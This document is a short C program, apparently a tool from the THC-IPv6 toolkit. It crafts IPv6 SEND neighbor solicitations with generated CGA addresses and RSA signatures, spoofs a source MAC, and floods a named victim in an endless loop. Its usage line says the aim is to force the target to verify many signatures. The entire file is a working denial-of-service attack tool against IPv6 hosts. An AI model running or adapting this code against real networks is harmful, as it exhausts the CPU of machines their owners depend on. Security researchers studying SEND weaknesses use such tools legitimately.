#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include "thc-ipv6.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <openssl/rsa.h>

int main(int argc, char **argv)
{
  thc_cga_hdr *cga_opt;
  thc_key_t *key;
  struct in6_addr addr6;
  unsigned char *pkt = NULL;
  unsigned char *dst6, *cga, *dev;
  char dummy[24], prefix[8], addr[50];
  char dsthw[] = "\xff\xff\xff\xff\xff\xff";  
  char srchw[] = "\xdd\xde\xad\xbe\xef\xff";
  int pkt_len = 0;

  
  if(argc != 5)
    {  
       printf("sendpees by willdamn <willdamn@gmail.com>\n");
       printf("usage: %s <inf> <key_length> <prefix> <victim>\n", argv[0]);
       printf("Send SEND neighbor solicitation messages and make target to verify a lota CGA and RSA signatures\n");
       exit(1);
    }
  
  dev = argv[1];
  
  memcpy(addr, argv[3], 50);
  inet_pton(PF_INET6, addr, &addr6);
  memcpy(prefix, &addr6, 8);
      
  key = thc_generate_key(atoi(argv[2]));
  if(key == NULL)
    { printf("Couldn't generate key!"); exit(1); }
  cga_opt = thc_generate_cga(prefix, key, &cga);  
  if(cga_opt == NULL)
    { printf("Error during CGA generation"); exit(1); }
    
  dst6 = thc_resolve6(argv[4]);

  memset(dummy, 'X', sizeof(dummy));
  dummy[16] = 1;
  dummy[17] = 1;
  memcpy(dummy, dst6, 16);
                                                      
  if((pkt = thc_create_ipv6(dev, PREFER_GLOBAL, &pkt_len, cga, dst6, 0, 0, 0, 0, 0)) == NULL)
    { 
      printf("Cannot create IPv6 header\n");
      exit(1);
    }
  if(thc_add_send(pkt, &pkt_len, ICMP6_NEIGHBORSOL, 0xdeadbeef, 0x0, dummy, 24, cga_opt, key, NULL, 0) < 0)
    { 
      printf("Cannot add SEND options\n");
      exit(1); 
    }
  free(cga_opt);
     
  if(thc_generate_pkt(dev, srchw, dsthw, pkt, &pkt_len) < 0)
    {
      fprintf(stderr, "Couldn't generate ipv6 packet!\n");
      exit(1); 
    }
  
  printf("Sending...");
  fflush(stdout);
  while(1)
      thc_send_pkt(dev, pkt, &pkt_len);
     
  return 0;
}
